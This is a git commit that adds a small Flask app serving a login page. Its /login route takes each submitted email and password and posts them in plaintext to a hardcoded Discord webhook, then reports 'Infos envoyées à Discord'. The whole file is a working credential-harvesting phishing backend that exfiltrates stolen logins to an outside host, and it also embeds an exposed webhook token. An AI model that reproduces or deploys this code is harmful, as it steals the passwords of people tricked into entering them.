529c587fc27b679e7d28fbc5cd917cbe169f88ae
Sem Fokker <sem.fokker.dirk@gmail.com>
2025-08-07 23:11:23 +0100

    initial commit

---
+++ app.py
@@ -0,0 +1,26 @@
+from flask import Flask, render_template, request
+import requests
+
+app = Flask(__name__)
+
+DISCORD_WEBHOOK_URL = "https://discord.com/api/webhooks/1403114831095267519/YlA2OvGZNVZe83ojBpZApnNt-SFcyfb11UzxpbkuWUA21hJBS6oG6NnfRuuP3Iq0-nik"
+
+@app.route('/')
+def index():
+    return render_template('login.html')
+
+@app.route('/login', methods=['POST'])
+def login():
+    email = request.form['email']
+    password = request.form['password']
+
+    payload = {
+        "content": f"🔐 Nouvelle tentative de login :\n📧 Email: {email}\n🔑 Mot de passe: {password}"
+    }
+
+    requests.post(DISCORD_WEBHOOK_URL, json=payload)
+
+    return "Infos envoyées à Discord ✅"
+
+if __name__ == '__main__':
+    app.run(port=5000, debug=True)
